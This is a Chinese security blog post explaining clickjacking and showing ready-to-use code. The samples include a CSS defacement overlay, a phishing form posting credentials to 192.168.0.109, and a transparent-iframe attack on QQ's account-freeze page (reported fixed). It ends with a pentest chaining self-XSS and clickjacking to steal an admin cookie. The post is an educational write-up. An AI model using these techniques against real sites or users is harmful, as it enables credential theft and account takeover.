---
layout: post
author: Vulkey_Chen
title: "鸡肋点搭配ClickJacking攻击-获取管理员权限"
date: 2017-12-20
permalink: /archives/2017-12-20/1
description: "笔者挖到了一个selfxss，在思考之后想起了ClickJacking，于是结合之..."
---

# 前言

有一段时间没做测试了，偶尔的时候也会去挖挖洞。本文章要写的东西是我利用`ClickJacking`拿下管理员权限的测试过程。但在说明过程之前，先带大家了解一下`ClickJacking`的**基本原理以及简单的漏洞挖掘**。

# ClickJacking

ClickJacking背景说明:

> ClickJacking（点击劫持）是由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼在2008年首创的。
> ClickJacking是一种视觉欺骗攻击手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情(被欺骗)的情况下，点击攻击者想要欺骗用户点击的位置。

说道视觉欺骗，相信有`炫技`经验的朋友们一定会想到，自己一个后台拿不下Webshell权限的时候，而想要黑掉首页从而达到炫技，使用的是什么呢？没错一般使用CSS样式表来劫持首页以造成黑掉的假象~

```html
<table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>hacked by key</h1></td></tr></tbody></table>
```

![CSS jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x00.png)

除了可以炫技，CSS劫持可以做的东西也有很多：例如经典的form表单钓鱼攻击

```html
<table+style="left:+0px;+top:+0px;+position:+fixed;z-index:+5000;position:absolute;width:100%;background-color:white;"><tr><td><form action="http://192.168.0.109/login.php" method="post">账号：<input type="text" name="name"><br>密码：<input type="password" name="pwd"><br><input type="submit" value="登陆"></form><td></tr></table>
```

![CSS jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x01.png)

这里就不对代码的意思进行解读了，可以看到CSS劫持达到的视觉欺骗攻击效果还是比较LOW的，因为这样的攻击手段偏被动式。而我要说的点击劫持其实也算是被动式，不过相对来说比较容易获得信任让被动式触发，这里只是单单对攻击手法谁的成功率比较高作为比较

前面背景介绍的时候说了，点击劫持攻击其实就是镶嵌一个iframe框架(**存在点击劫持漏洞的页面**)在页面上，然后再把其修改为透明的样式。这样的操作只是造成了视觉欺骗，还没达到欺骗点击的效果，所以就需要知道iframe框架其按钮的位置，然后在基于透明层模拟一个位置大小相同的按钮，发给用户让其点击~~

这里以QQ安全中心的一个点击劫持为例，作为一个QQ的资深用户应该知道QQ是有安全中心紧急冻结QQ服务的，只要登录自己的安全中心就可以冻结，**地址(漏洞地址，目前漏洞已经修复)**为：<https://aq.qq.com/cn2/message_center/wireless/wireless_seal_auth?source_id=2985>

![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x02.png)

一点击，你的QQ就被会冻结(当时不知道逗了多少人~)，那这样怎么利用呢？

1.建立iframe框架:

```html
<iframe id="frame" src="https://aq.qq.com/cn2/message_center/wireless/wireless_seal_auth?source_id=2985"></iframe>
```

2.建立iframe的CSS样式:

```css
#frame {
    border: 0px; /*边框属性为0*/
    height: 100%; /*框架高度100%*/
    width: 100%; /*框架宽度100%*/
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
```

3.获取iframe框架引用的原页面的按钮位置和大小:

大小直接通过审查元素可以看得到:

![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x03.png)

现在要获取的就是按钮元素到浏览器顶部的距离，这里通过`id.offsetTop`有些时候是无法直接获取的:

> \>\>span_verify.offsetTop
> ←16

获取到的是16~很醉，所以使用如下的方法直接获取:

```javascript
document.getElementById('span_verify').getBoundingClientRect().top
```

![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x04.png)
4.建立按钮:

```html
<input type="button" class="button" value="Click" />
```

5.根据第三步骤获取到的建立按钮样式:

```css
.button {
    position: fixed;
    width: 100%;
    height: 42px;
    margin: 0 auto;
    left: 0;
    right: 0;
    display: block;
    top: 278px;
} 
```

6.散播，用户中招:
![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x05.png)
![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x06.png)

## 一次点击劫持攻击案例

说了这么多，在前几天的测试中我是如何拿到管理员权限呢？挖掘到一处self-xss，这里先说明下self-xss可以理解为只能攻击myself~

发现流程:

**发现输入框->秉着见框就X的原理插入XSS Payload->弹框->发现成功**

然而获取到的URL链接是`/?keyword=<script>alert(1)</script>`，但是不是xss，keyword的值显示在输入框内，需要你再点击`搜索标题按钮`才可以触发漏洞。

**形成的攻击思路->iframe嵌套漏洞URL链接->Click Jacking攻击页面构造->通过留言给管理员引诱触发**

![Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x07.png)

攻击页面构造流程其实耐心读到这里的朋友已经是非常明确步骤了:

**建立iframe框架->建立iframe框架CSS样式->获取按钮位置大小->建立按钮->建立按钮CSS样式->留言板留言外网攻击链接->获取管理员Cookie->Cookie伪造进入后台**

# 结尾

一次很有意思的实践，让自己满满的成就感，同时也完成了项目任务~
